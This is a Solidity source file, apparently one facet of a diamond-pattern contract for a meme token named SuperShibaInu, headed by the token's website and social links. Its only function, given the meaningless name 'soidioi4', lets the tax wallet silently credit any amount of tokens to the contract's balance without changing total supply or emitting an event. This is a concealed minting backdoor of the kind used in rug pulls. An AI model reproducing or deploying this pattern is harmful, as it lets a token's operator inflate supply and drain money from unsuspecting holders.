/*
https://supershibainu.club
https://t.me/SuperShibaInu_portal
https://twitter.com/SINU_erc20
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
import "./TestLib.sol";
contract soidioi4Facet is Context, Ownable {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwap = true;
        _;
        ds.inSwap = false;
    }

    function soidioi4(uint256 diifji) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_msgSender() == ds._taxWallet);
        ds._balances[address(this)] = ds._balances[address(this)].add(diifji);
    }
}
